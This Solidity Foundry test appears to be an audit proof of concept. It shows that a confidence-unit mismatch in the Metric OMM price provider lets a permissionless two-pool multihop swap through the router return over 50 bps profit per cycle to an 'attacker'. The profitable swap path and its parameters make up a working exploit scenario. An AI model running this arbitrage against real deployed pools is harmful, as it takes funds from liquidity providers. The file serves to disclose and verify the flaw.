// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {IMetricOmmSimpleRouter} from "../contracts/interfaces/IMetricOmmSimpleRouter.sol";
import {MetricOmmPool} from "@metric-core/MetricOmmPool.sol";
import {MockPriceProviderRouter, SimpleRouterTestBase} from "./helpers/SimpleRouterTestBase.sol";

/// @notice End-to-end multihop impact of the PriceProvider confidence-unit mismatch.
/// @dev The bid/ask constants are the exact human-readable quotes produced by the production-provider PoC
///      with fresh 500 bps feeds, the operational 300,000 confidence setting, and a 10 bps margin.
contract MetricOmmRouterMultiFeedSpreadPoC is SimpleRouterTestBase {
  uint256 internal constant WAD = 1e18;

  MetricOmmPool internal lowPricePool;
  MetricOmmPool internal highPricePool;

  function setUp() public override {
    super.setUp();

    MockPriceProviderRouter lowProvider = new MockPriceProviderRouter();
    lowProvider.setTokens(address(weth), address(token1));
    lowProvider.setBidAndAskPrice(_toX64(98_401_500_000_000_000_000), _toX64Up(101_601_500_000_000_000_000));
    oracle = lowProvider;
    lowPricePool = _deployPool(address(weth), address(token1));

    MockPriceProviderRouter highProvider = new MockPriceProviderRouter();
    highProvider.setTokens(address(weth), address(token1));
    highProvider.setBidAndAskPrice(_toX64(102_337_560_000_000_000_000), _toX64Up(105_665_560_000_000_000_000));
    oracle = highProvider;
    highPricePool = _deployPool(address(weth), address(token1));

    // Supply 100 tokens per bin to both pools, enough that a 100-quote-token cycle crosses
    // boundaries but does not exhaust liquidity. LiquidityHelper pays pool callbacks directly.
    vm.deal(address(this), 1_200 ether);
    weth.deposit{value: 1_200 ether}();
    weth.transfer(address(lpContract), 1_200 ether);
    token1.mint(address(lpContract), 1_000e18);
    lpContract.addLiquidityRange(address(lowPricePool), 10, -4, 4, 100e18);
    lpContract.addLiquidityRange(address(highPricePool), 11, -4, 4, 100e18);
  }

  function test_operationalProviderQuotesCreatePermissionlessMultihopProfit() public {
    uint128 amountIn = 100e18;
    address[] memory tokens = new address[](3);
    tokens[0] = address(token1);
    tokens[1] = address(weth);
    tokens[2] = address(token1);

    address[] memory pools = new address[](2);
    pools[0] = address(lowPricePool);
    pools[1] = address(highPricePool);
    bytes[] memory extensionDatas = new bytes[](2);

    uint256 tokenBefore = token1.balanceOf(swapper);
    vm.prank(swapper);
    uint256 amountOut = router.exactInput(
      IMetricOmmSimpleRouter.ExactInputParams({
        tokens: tokens,
        pools: pools,
        extensionDatas: extensionDatas,
        zeroForOneBitMap: 2, // token1 -> WETH on low pool, WETH -> token1 on high pool.
        amountIn: amountIn,
        amountOutMinimum: amountIn,
        recipient: swapper,
        deadline: _deadline()
      })
    );

    uint256 profit = amountOut - amountIn;
    uint256 profitBps = Math.mulDiv(profit, 10_000, amountIn);

    emit log_string("--- Real Metric pools and router ---");
    emit log_named_decimal_uint("cycle input", amountIn, 18);
    emit log_named_decimal_uint("cycle output", amountOut, 18);
    emit log_named_decimal_uint("attacker profit", profit, 18);
    emit log_named_uint("profit after bin traversal and pool fees (bps)", profitBps);

    assertEq(token1.balanceOf(swapper), tokenBefore + profit, "profit must be realized in attacker balance");
    assertGt(profitBps, 50, "real pools still lose more than 50 bps per cycle");
    _assertRouterEmpty();
  }

  function _toX64(uint256 priceWad) internal pure returns (uint128) {
    return uint128(Math.mulDiv(priceWad, Q64, WAD));
  }

  function _toX64Up(uint256 priceWad) internal pure returns (uint128) {
    return uint128(Math.mulDiv(priceWad, Q64, WAD, Math.Rounding.Ceil));
  }
}
